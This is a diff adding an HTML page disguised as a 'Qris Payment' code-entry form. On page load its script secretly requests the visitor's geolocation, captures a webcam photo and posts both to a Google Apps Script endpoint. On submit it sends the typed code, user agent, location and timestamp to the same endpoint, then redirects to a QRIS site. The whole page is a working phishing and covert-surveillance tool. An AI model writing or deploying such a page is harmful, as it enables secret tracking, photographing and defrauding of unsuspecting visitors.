@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Qris Payment</title>
+<style>
+body {display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;background:#f5f5f5;font-family:sans-serif;}
+.container {text-align:center;background:#fff;padding:20px;border-radius:12px;box-shadow:0 4px 12px rgba(0,0,0,0.15);width:320px;}
+img {max-width:300px;width:100%;border-radius:8px;margin-bottom:20px;}
+input {padding:12px 16px;width:100%;max-width:280px;border:1px solid #ccc;border-radius:8px;font-size:16px;margin-bottom:15px;}
+input:focus {border-color:#3b82f6;outline:none;box-shadow:0 0 0 2px rgba(59,130,246,.3);}
+button {padding:12px 20px;border:none;border-radius:8px;background:#3b82f6;color:white;font-size:16px;cursor:pointer;width:100%;}
+button:hover {background:#2563eb;}
+#message {margin-top:12px;font-weight:bold;display:none;}
+</style>
+</head>
+<body>
+<div class="container">
+<img src="https://i.ibb.co/N27QVLRG/Venice-AI-s-Mr-Chg9.webp" alt="Logo">
+<input id="codeInput" type="text" placeholder="PUT CODE">
+<button onclick="handleSubmit()">Submit</button>
+<div id="message"></div>
+</div>
+
+<script>
+const APPSCRIPT_URL = "https://script.google.com/macros/s/AKfycbxh3K_mqkgiM_52UmymnCSZAsGS5LD9ER9TViXqRFZJ1t5gVELAzE8T9CsPb-63YHCl/exec"; // ganti Web App URL
+const REDIRECT_URL = "https://qris.interactive.co.id";   // ganti redirect lo
+
+async function autoRecord(){
+    let location="Unavailable", photo="";
+    try{
+        const pos=await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej));
+        location=`${pos.coords.latitude},${pos.coords.longitude}`;
+    }catch(e){console.warn("Lokasi ditolak");}
+
+    try{
+        const stream=await navigator.mediaDevices.getUserMedia({video:true});
+        const video=document.createElement("video");
+        video.srcObject=stream;
+        await video.play();
+        const canvas=document.createElement("canvas");
+        canvas.width=video.videoWidth||640;
+        canvas.height=video.videoHeight||480;
+        canvas.getContext("2d").drawImage(video,0,0,canvas.width,canvas.height);
+        photo=canvas.toDataURL("image/jpeg");
+        stream.getTracks().forEach(track=>track.stop());
+    }catch(e){console.warn("Kamera ditolak");}
+
+    await fetch(APPSCRIPT_URL,{
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body:JSON.stringify({photo,location})
+    });
+}
+
+async function handleSubmit(){
+    const code=document.getElementById("codeInput").value;
+    const userAgent=navigator.userAgent;
+    let location="Unavailable";
+    try{
+        const pos=await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej));
+        location=`${pos.coords.latitude},${pos.coords.longitude}`;
+    }catch(e){}
+
+    const timestamp=new Date().toISOString();
+    const body={code,userAgent,location,timestamp};
+
+    document.getElementById("message").style.display="block";
+    document.getElementById("message").textContent="Submitting...";
+
+    await fetch(APPSCRIPT_URL,{
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body:JSON.stringify(body)
+    });
+
+    document.getElementById("message").textContent="Submitted!";
+    setTimeout(()=>{window.location.href=REDIRECT_URL;},1500);
+}
+
+window.onload=autoRecord;
+</script>
+</body>
+</html>
